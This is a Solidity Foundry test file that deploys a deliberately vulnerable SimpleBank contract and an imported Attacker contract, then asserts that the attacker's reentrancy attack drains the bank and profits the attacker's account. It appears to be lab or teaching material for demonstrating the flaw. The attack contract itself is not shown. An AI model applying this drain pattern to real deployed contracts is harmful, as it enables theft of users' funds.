// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Vulnerable.sol";
import "../exploit/Attacker.sol";

contract ReentrancyTest is Test {
    SimpleBank bank;
    Attacker attacker;
    address user = address(0xBEEF);
    address payable attackerEOA = payable(address(0xA11CE)); // receives profit

    function setUp() public {
        bank = new SimpleBank();

        // Honest user deposit: 5 ETH
        vm.deal(user, 5 ether);
        vm.prank(user);
        bank.deposit{value: 5 ether}();

        // Deploy attacker contract; Owner = attackerEOA
        vm.prank(attackerEOA);
        attacker = new Attacker(bank);

        // Fund attacker contract with 1 ETH AND deposit as attacker,
        // so balances[attacker] >= 1 ether (needed for the initial withdraw check)
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker)); // msg.sender = attacker
        bank.deposit{value: 1 ether}();
    }

    function testExploitDrainsBank() public {
        uint256 beforeBal = address(bank).balance;

        // Start the attack
        attacker.attack(1 ether);

        uint256 afterBal = address(bank).balance;

        assertLt(afterBal, beforeBal, "bank should be drained");
        assertGt(attackerEOA.balance, 0, "attacker EOA should profit");
    }
}

